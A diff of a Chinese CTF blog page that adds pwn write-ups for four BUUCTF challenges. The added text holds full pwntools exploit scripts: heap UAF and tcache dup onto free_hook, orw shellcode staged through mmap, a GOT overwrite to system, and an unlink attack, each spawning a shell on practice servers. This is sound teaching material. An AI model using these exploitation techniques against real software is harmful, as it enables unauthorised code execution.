@@ -121,7 +121,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    10.7k 字
+                    13.2k 字
                   </span>&nbsp;
                 
 
@@ -129,7 +129,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      58 分钟
+                      71 分钟
                   </span>&nbsp;
                 
 
@@ -1807,6 +1807,374 @@ free()
 
 itr()</code></pre>
 <p>其中exp的爆破stdout部分，可以当作模版使用，来自pzhxbz大佬的。</p>
+<h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a><code>ciscn_2019_en_3</code></h2><h3 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h3><p>常规堆题，UAF，dup打<code>free_hook_</code>。上来用<code>puts(&amp;s)</code>，来泄漏栈上存在的libc地址。</p>
+<h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./ciscn_2019_en_3&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,29542)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+rce18 = [0x4f2c5,0x4f322,0x10a38c]
+realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
+arae18 = 0x3ebca0
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(size,data):
+    sla(&#39;ice&#39;,&#39;1&#39;)
+    sla(&#39;size&#39;,str(size))
+    sa(&#39;story&#39;,str(data))
+def free(idx):
+    sla(&#39;ice&#39;,&#39;4&#39;)
+    sla(&#39;dex&#39;,str(idx))
+
+payload = &#39;a&#39; * (0x20-8)
+sa(&#39;name&#39;,payload)
+sa(&#39;ID&#39;,&#39;chumen77&#39;)
+ru(&#39;chumen77&#39;)
+libc_base = uu64(r(6)) - 0x81237
+info_addr(&#39;libc_base&#39;,libc_base)
+add(0x50,&#39;aaaaaaaa&#39;)
+
+free(0)
+free(0)
+free_hook = libc_base + 0x3ed8e8
+add(0x50,p64(free_hook))
+add(0x50,p64(free_hook))
+rec = rce18[1] + libc_base
+add(0x50,p64(rec))
+free(0)
+itr()</code></pre>
+<h2 id="极客大挑战2019-Not-bad"><a href="#极客大挑战2019-Not-bad" class="headerlink" title="极客大挑战2019 Not bad"></a>极客大挑战2019 Not bad</h2><h3 id="分析-21"><a href="#分析-21" class="headerlink" title="分析"></a>分析</h3><p>溢出0x18个字节，加上本身的栈长度，读orw 的shellcode内存不是很够用。需要迁移到mmap，进行orw。所以摆在栈上的shellcode就是，来一个read函数，把orw放在mmap上，然后再跳转上去执行即可。并且再次用到 <code>jmp rsp</code> + shellcode.</p>
+<h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./bad&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,29794)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+mmap = 0x123000
+jmp_rsp = 0x0000000000400a01
+# bss = 0x6010B0 - 0x20
+orw = asm(shellcraft.open(&quot;./flag&quot;))
+orw += asm(shellcraft.read(3,&quot;rsp&quot;,0x30))
+orw += asm(shellcraft.write(1,&quot;rsp&quot;,0x30))
+
+payload = asm(shellcraft.read(0,mmap + 0x300,0x100)) + asm(&#39;mov rax,0x123300;call rax&#39;)
+payload = payload.ljust(0x28,&#39;a&#39;)
+payload += p64(jmp_rsp) +   asm(&#39;sub rsp,0x30;jmp rsp&#39;)
+
+sa(&#39;fun&#39;,payload)
+s(orw)
+itr()</code></pre>
+<h2 id="ciscn-2019-final-5"><a href="#ciscn-2019-final-5" class="headerlink" title="ciscn_2019_final_5"></a><code>ciscn_2019_final_5</code></h2><h3 id="分析-22"><a href="#分析-22" class="headerlink" title="分析"></a>分析</h3><pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre><p>保护开的不多，分析和利用起来简单不少。</p>
+<p>这个题难点就是在于发现漏洞点。</p>
+<h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><pre><code class="c"> __int64 result; // rax
+  signed int i; // [rsp+4h] [rbp-1Ch]
+  int size; // [rsp+8h] [rbp-18h]
+  int idx; // [rsp+Ch] [rbp-14h]
+  void *buf; // [rsp+10h] [rbp-10h]
+  __int64 v5; // [rsp+18h] [rbp-8h]
+
+ printf(&quot;index: &quot;);
+  idx = read_int();
+  if ( idx &lt; 0 || idx &gt; 16 )
+  {
+    puts(&quot;index is invalid.&quot;);
+    exit(-1);
+  }
+  printf(&quot;size: &quot;);
+  size = read_int();
+  if ( size &lt; 0 || size &gt; 0x1000 )
+  {
+    puts(&quot;size is invalid.&quot;);
+    exit(-1);
+  }
+  buf = malloc(size);
+  if ( !buf )
+  {
+    puts(&quot;malloc error.&quot;);
+    exit(-1);
+  }
+  printf(&quot;content: &quot;);
+  read(0, buf, size);
+  show_diy((__int16)buf);</code></pre>
+<p>可以自定义输入堆的编号，最大可以17个，就感觉有点奇怪。然后以栈上的一个buf来存取分配heap的地址。</p>
+<pre><code class="c">result = sub_400AB0((__int64)buf, idx);
+  v5 = result;
+  for ( i = 0; i &lt;= 16; ++i )
+  {
+    result = heaplist_idx[i];
+    if ( !result )
+    {
+      heaplist_idx[i] = v5;
+      result = i;
+      sizelist[i] = size;
+      break;
+    }
+  }</code></pre>
+<pre><code class="c">__int64 __fastcall sub_400AB0(__int64 a1, int a2)
+{
+  return a1 | a2;
+}</code></pre>
+<p>可以看到以堆地址与堆的id进行以来一个<code>|</code> 运算。然后返回回来给v5，然后在存入bss的一段地址中。算是处理过的堆地址。</p>
+<p>尝试研究一下，做完处理是什么样子：</p>
+<p>先分配一个堆号为1 和 16的堆块，看下bss里面是存入了什么。</p>
+<pre><code>x/30gx  0x6020E0
+0x6020e0:       0x0000000000e35270(16)      0x0000000000e35281(0)</code></pre><pre><code>In [2]: hex(0x0e35260 | 16)
+Out[2]: &#39;0xe35270&#39;
+
+In [3]: hex(0x00e35281 | 0)
+Out[3]: &#39;0xe35281&#39;</code></pre><p>差不多就是这样，但是也可以发现点异样。因为是<code>|</code> 的逻辑运算，在<code>0-0xf</code>是一个轮回后，到了16就又算是一个轮回。<br>既然处理过堆地址，那肯定取出来进行操作时，肯定还会再进行处理回来。下面就是注意怎么处理的。</p>
+<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><pre><code class="c"> for ( i = 0; i &lt;= 16; ++i )
+  {
+    result = get_idx(heaplist_idx[i]);
+    if ( result == idx )
+    {
+      printf(&quot;content: &quot;);
+      read_diy((void *)(heaplist_idx[i] &amp; 0xFFFFFFFFFFFFFFF0LL), sizelist[i]);
+      result = puts(&quot;edit success.\n&quot;);
+      break;
+    }
+  }</code></pre>
+<pre><code class="c">__int64 __fastcall get_idx(char a1)
+{
+  return a1 &amp; 0xF;
+}</code></pre>
+<p>可以看到其是依次0-17编号对堆块进行遍历取出，再取出时会对其进行<code>&amp; 0xf</code>的操作来尝试获取堆块的编号。</p>
+<p>来测试一下：</p>
+<pre><code class="c">
+In [5]: hex(0x00e35281 &amp; 0xf). #1号堆块的计算
+Out[5]: &#39;0x1&#39;
+
+In [6]: hex(0x00e35270 &amp; 0xf) #16号堆块的计算
+Out[6]: &#39;0x0&#39;
+</code></pre>
+<p>这就很明显有异样了，申请的是16号堆块其认为是0号堆块。所以申请16号的堆块，其可以用edit（0）来进行编辑16号堆块。</p>
+<p>然后看其如何编辑的：</p>
+<pre><code class="c">  read_diy((void *)(heaplist_idx[i] &amp; 0xFFFFFFFFFFFFFFF0LL), sizelist[i]);</code></pre>
+<p>其是根据bss上存的处理过堆块地址进行一下<code>&amp; 0xFFFFFFFFFFFFFFF0</code> 来进行编辑的。<br>对于上来就申请了一个16号的堆块，很容易知道其堆块的末3为应该是0x260，但是当时存入的是0x270，尝试进行一下<code>&amp; 0xFFFFFFFFFFFFFFF0</code>：</p>
+<pre><code>In [7]: hex(0x00e35270 &amp; 0xFFFFFFFFFFFFFFF0)
+Out[7]: &#39;0xe35270&#39;</code></pre><p>发现并不是从0x260进行编辑，但是同样还是可以编辑同样的size，所以这就造成了溢出，并且是0x10个字节。</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ul>
+<li>释放2个tcache 堆块，并且利用0x10字节，改其中一个堆块的fd，改为free的got位置</li>
+<li>申请堆块到free got处，改free 为 puts</li>
+<li>构造出一个unsortbin的堆块，然后再申请一个堆块，就会在这个堆块上留下部分的libc地址，然后进行leak</li>
+<li>算出system的地址，继续改free got 处为 system，然后free一个带有<code>/bin/sh\x00</code>的堆块，即可拿到shell</li>
+</ul>
+<h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *
+import time
+local_file  = &#39;./ciscn_final_5&#39;
+elf = ELF(local_file)
+# context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,27180)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+rce18 = [0x4f2c5,0x4f322,0x10a38c]
+realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
+arae18 = 0x3ebca0
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(idx,size,data):
+    sla(&#39;choice:&#39;,&#39;1&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sla(&#39;size&#39;,str(size))
+    sa(&#39;content&#39;,str(data))
+def free(idx):
+    sla(&#39;choice:&#39;,&#39;2&#39;)
+    sla(&#39;dex&#39;,str(idx))
+
+def edit(idx,data):
+    sla(&#39;choice:&#39;,&#39;3&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sa(&#39;content&#39;,str(data))
+
+
+add(16,0x18,&#39;sasdasdas&#39;)
+add(1,0x30,&#39;aaaaaaaa&#39;)
+add(2,0x30,&#39;aaaaaaaa&#39;)
+free(2)
+free(1)
+edit(0,p64(0) + p64(0x121) + p64(0x000000000602010))
+add(5,0x800,&#39;aaaaaaaa&#39;)
+add(6,0x50,&#39;aaaa&#39;)
+add(3,0x30,&#39; &#39;)
+free(5)
+add(7,0x90,&#39; &#39;)
+add(4,0x30,&#39;aaaaaaaa&#39; + p64(elf.plt[&#39;puts&#39;]))
+free(7)
+r()
+libc_base = uu64(r(6)) - 0x3ec120
+info_addr(&#39;libc_base&#39;,libc_base)
+edit(4,&#39;aaaaaaaa&#39; + p64(libc.sym[&#39;system&#39;] + libc_base))
+add(9,0x10,&#39;/bin/sh\x00&#39;)
+free(9)
+itr()</code></pre><p>由于其确定堆块的特殊性，在申请堆块到free got时，因为其在<code>0x000000000602018</code>，但是在经过逻辑运算处理后，放入bss后，想要再进行操作就有点困难，所以申请到<code>0x000000000602010</code> 就OK了。</p>
+<h2 id="ciscn-2019-s-1"><a href="#ciscn-2019-s-1" class="headerlink" title="ciscn_2019_s_1"></a><code>ciscn_2019_s_1</code></h2><h3 id="分析-23"><a href="#分析-23" class="headerlink" title="分析"></a>分析</h3><p>保护：</p>
+<pre><code>[*] &#39;/ctf/work/buuctf/shuati/ciscn_2019_s_1/ciscn_s_1&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre><p>Add函数：最多可以申请33个堆，且问你堆的编号，并且根据这个编号作为索引上bss段来存储heap的地址。大小范围在<code>0x7f - 0x100</code>。</p>
+<p>edit函数：</p>
+<pre><code class="c">v0[read(0, (void *)heap[v2], (signed int)len[v2])] = 0;</code></pre>
+<p>明显存在着off by null。且有key1控制着，只能编辑2次。</p>
+<pre><code class="c">if ( key1 == 2 )
+    exit(0);</code></pre>
+<p>Show函数：<br>Key2有值才能用。</p>
+<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><ul>
+<li>由于没有开启pie保护，这样明显可以unlink攻击，申请一个32堆号的堆，大小0xf8，都是越大越好，为了上靠近key1、key2，然后进行控制.</li>
+</ul>
+<p>剩下的就很简单了。</p>
+<h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *
+import time
+local_file  = &#39;./ciscn_s_1&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,29756)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+rce18 = [0x4f2c5,0x4f322,0x10a38c]
+realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
+arae18 = 0x3ebca0
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+def add(idx,size,data):
+    sla(&#39;show\n&#39;,&#39;1&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sla(&#39;size&#39;,str(size))
+    sa(&#39;content&#39;,str(data))
+def free(idx):
+    sla(&#39;show\n&#39;,&#39;2&#39;)
+    sla(&#39;dex&#39;,str(idx))
+def edit(idx,data):
+    sla(&#39;show\n&#39;,&#39;3&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sa(&#39;content&#39;,str(data))
+
+def show(idx):
+    sla(&#39;show\n&#39;,&#39;4&#39;)
+    sla(&#39;dex&#39;,str(idx))
+key2 = 0x6022B8
+
+for i in range(7):
+    add(i,0xf8,&#39;aaaaaaaa&#39;)
+
+add(7,0xf8,&quot;aaaa&quot;)#8
+payload = p64(0) + p64(0x32) + p64(0x6021e0 - 0x18) + p64(0x6021e0 - 0x10) + p64(0) * 2 + p64(0x30)
+add(32,0xf8,payload)#32
+add(8,0x88,&quot;aaaa&quot;)
+add(9,0xf8,&quot;aaaa&quot;)
+add(10,0x88,&#39;aaaa&#39;)
+
+for i in range(7):
+    free(i+1) # 由于32的堆块申请后破坏了0号堆块的在bss上地址的储存
+payload = &#39;a&#39; * 0x80 + p64(0x180)
+edit(8,payload)
+free(9)
+payload = p64(0) * 3 + p64(0x00000000006021c8) + &#39;\x00&#39;  * (0xf0 - 0x8 * 4) + p64(0x0000000400000001)
+edit(32,payload)
+add(11,0x88,&#39; &#39;)
+show(11)
+r()
+libc_base = uu64(r(6)) - 0x3ebf20
+info_addr(&#39;libc_base&#39;,libc_base)
+
+free_hook = libc_base + 0x3ed8e8
+rec = rce18[1] + libc_base
+payload = p64(0) * 3 + p64(free_hook)
+edit(32,payload)
+edit(32,p64(rec))
+free(11)
+itr()</code></pre>
 
             <hr>
           </div>
@@ -1909,11 +2277,6 @@ itr()</code></pre>
 
 
     
-  <!-- 备案信息 -->
-  <a href="http://beian.miit.gov.cn/" target="_blank"
-     rel="nofollow noopener">豫ICP备20003962号</a>
-  
-
 
 
     <!-- cnzz Analytics icon -->
